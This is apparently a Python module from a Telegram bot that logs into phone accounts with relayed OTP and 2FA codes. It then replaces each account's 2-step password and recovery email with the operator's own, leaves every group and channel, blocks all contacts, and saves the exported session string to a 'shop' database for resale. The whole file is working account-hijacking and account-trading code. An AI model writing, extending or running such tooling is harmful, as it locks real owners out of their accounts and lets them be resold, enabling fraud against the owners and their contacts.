from pyrogram import Client, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid
from info import ADMIN_ID, API_ID, API_HASH
from database import get_config, add_account
import asyncio

# States: {admin_id: {"step": "...", ...}}
session_states = {}


async def login_command(client: Client, message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.reply_text(
        "📱 Please enter the **phone number** (with country code, e.g., +919876543210):"
    )
    session_states[message.from_user.id] = {"step": "waiting_phone"}


async def handle_session_message(client: Client, message: Message):
    admin_id = message.from_user.id
    state = session_states.get(admin_id)

    if not state:
        return

    step = state.get("step")

    if step == "waiting_phone":
        phone = message.text.strip()
        temp_client = Client(
            "temp_session",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        try:
            await temp_client.connect()
            code_info = await temp_client.send_code(phone)
            session_states[admin_id] = {
                "step": "waiting_code",
                "phone": phone,
                "phone_code_hash": code_info.phone_code_hash,
                "temp_client": temp_client
            }
            await message.reply_text(f"✅ Code sent to `{phone}`. Please enter the OTP:")
        except FloodWait as e:
            await asyncio.sleep(e.value)
            await message.reply_text(f"⚠️ FloodWait: Please wait {e.value} seconds and try again.")
        except Exception as e:
            await message.reply_text(f"❌ Error: `{str(e)}`")
            session_states.pop(admin_id, None)

    elif step == "waiting_code":
        code = message.text.strip()
        temp_client = state["temp_client"]
        phone = state["phone"]
        phone_code_hash = state["phone_code_hash"]
        try:
            await temp_client.sign_in(phone, phone_code_hash, code)
            # Instead of auto-processing, prompt choices first
            await ask_automation_choices(client, admin_id, temp_client, phone)
        except SessionPasswordNeeded:
            session_states[admin_id]["step"] = "waiting_password"
            await message.reply_text("🔐 Two-step verification enabled. Enter your password:")
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await message.reply_text("❌ Invalid or expired code. Try again or restart with /login.")
        except Exception as e:
            await notify_admin_failure(client, admin_id, phone, f"Sign-in error: {str(e)}")
            session_states.pop(admin_id, None)

    elif step == "waiting_password":
        password = message.text.strip()
        temp_client = state["temp_client"]
        phone = state["phone"]
        try:
            await temp_client.check_password(password)
            # Instead of auto-processing, prompt choices first
            await ask_automation_choices(client, admin_id, temp_client, phone)
        except PasswordHashInvalid:
            await message.reply_text("❌ Incorrect password. Please try again:")
        except Exception as e:
            await notify_admin_failure(client, admin_id, phone, f"Password check error: {str(e)}")
            session_states.pop(admin_id, None)

    elif step == "waiting_recovery_email":
        email = message.text.strip()
        temp_client = state["temp_client"]
        phone = state["phone"]
        choices = state["choices"]
        
        from database import update_config
        update_config("recovery_email", email)
        await message.reply_text(f"✅ Recovery email set to `{email}`. Proceeding...")
        await process_account_automation(client, admin_id, temp_client, phone, choices)

    elif step == "waiting_admin_2fa":
        password = message.text.strip()
        temp_client = state["temp_client"]
        phone = state["phone"]
        choices = state["choices"]
        
        from database import update_config
        update_config("admin_2fa", password)
        await message.reply_text(f"✅ Admin 2FA set to `{password}`. Proceeding...")
        await process_account_automation(client, admin_id, temp_client, phone, choices)


async def ask_automation_choices(bot: Client, admin_id: int, user_client: Client, phone: str):
    """Prompts the administrator with feature toggle switches using inline layout buttons."""
    # Temporarily hold the interactive client session
    session_states[admin_id].update({
        "step": "waiting_menu_choice",
        "temp_client": user_client,
        "phone": phone
    })

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Full Setup (Chat Del, Ban, 2FA, Email)", callback_data="setup_all")],
        [InlineKeyboardButton("🧹 Clean Setup (Chat Del + Ban Only)", callback_data="setup_clean")],
        [InlineKeyboardButton("🛡️ Security Setup (2FA + Email Only)", callback_data="setup_sec")],
        [InlineKeyboardButton("⏩ Skip All (Directly Add to Shop)", callback_data="setup_skip")]
    ])

    await bot.send_message(
        chat_id=admin_id,
        text=f"✅ **OTP Verified for {phone}!**\n\nPlease select what configurations you want the bot to run on this account:",
        reply_markup=keyboard
    )


async def handle_automation_callback(bot: Client, callback: CallbackQuery):
    """Processes responses from the interactive configuration menu."""
    admin_id = callback.from_user.id
    state = session_states.get(admin_id)

    if not state or state.get("step") != "waiting_menu_choice":
        await callback.answer("❌ Interactive configuration session expired.", show_alert=True)
        return

    await callback.answer("Processing option...")
    data = callback.data
    temp_client = state["temp_client"]
    phone = state["phone"]

    # Configure option selection maps
    choices = {
        "chat_delete": data in ["setup_all", "setup_clean"],
        "ban_users": data in ["setup_all", "setup_clean"],
        "change_2fa": data in ["setup_all", "setup_sec"],
        "change_email": data in ["setup_all", "setup_sec"]
    }

    # Pass choice parameters to automation routines
    await callback.message.delete()
    await process_account_automation(bot, admin_id, temp_client, phone, choices)


async def process_account_automation(bot: Client, admin_id: int, user_client: Client, phone: str, choices: dict):
    config = get_config()
    recovery_email = config.get("recovery_email")
    admin_2fa = config.get("admin_2fa")

    # 1. Check Config updates if security alterations are selected
    if choices["change_email"] and not recovery_email:
        session_states[admin_id].update({"step": "waiting_recovery_email", "choices": choices})
        await bot.send_message(admin_id, "📧 Recovery mail is not set. Please send the recovery email to use:")
        return

    if choices["change_2fa"] and not admin_2fa:
        session_states[admin_id].update({"step": "waiting_admin_2fa", "choices": choices})
        await bot.send_message(admin_id, "🔐 Admin 2FA password is not set. Please send the password to set:")
        return

    # Build dynamically generated loading notification logs
    status_text = "⚙️ **Starting personalized automation updates...**"
    if choices["change_email"]: status_text += "\n- Modifying recovery email configuration"
    if choices["change_2fa"]: status_text += "\n- Setting custom 2-Step Verification password"
    if choices["chat_delete"]: status_text += "\n- Purging/leaving channels and group chats"
    if choices["ban_users"]: status_text += "\n- Restricting/blocking historical messaging profile contacts"

    await bot.send_message(admin_id, status_text)

    try:
        # 2. Security Changes
        if choices["change_2fa"] or choices["change_email"]:
            try:
                # Use fallback blanks if option checks were bypassed
                p_2fa = admin_2fa if choices["change_2fa"] else None
                p_email = recovery_email if choices["change_email"] else None
                
                await user_client.set_password(new_password=p_2fa, email=p_email)
                await bot.send_message(admin_id, "✅ Profile access passwords and security options initialized.")
            except Exception as e:
                await bot.send_message(admin_id, f"⚠️ Secure configurations could not complete: `{e}`")

        # 3. Clean up Groups, Supergroups, and Channels
        if choices["chat_delete"] or choices["ban_users"]:
            async for dialog in user_client.get_dialogs():
                if choices["chat_delete"] and dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP, enums.ChatType.CHANNEL]:
                    try:
                        await user_client.leave_chat(dialog.chat.id)
                    except:
                        pass
                elif choices["ban_users"] and dialog.chat.type in [enums.ChatType.PRIVATE, enums.ChatType.BOT]:
                    if dialog.chat.id != 777000:  # Skip system alerts
                        try:
                            await user_client.block_user(dialog.chat.id)
                        except:
                            pass
            
            await bot.send_message(admin_id, "✅ Selected dialog purges and chat wipe restrictions finished.")

        # Finalize and export session asset
        session_string = await user_client.export_session_string()
        await user_client.disconnect()
        
        # Save to backend shop database pool
        add_account(phone, session_string, "AUTO", 0.0)
        
        await bot.send_message(admin_id, f"🎉 **Account {phone} added successfully!**\nAll selected background modifications are complete.")
        session_states.pop(admin_id, None)

    except Exception as e:
        await notify_admin_failure(bot, admin_id, phone, str(e))
        session_states.pop(admin_id, None)


async def notify_admin_failure(bot: Client, admin_id: int, phone: str, error: str):
    await bot.send_message(
        admin_id, 
        f"❌ **Automation Failed for {phone}**\n\nError: `{error}`\n\nPlease check the account manually."
    )
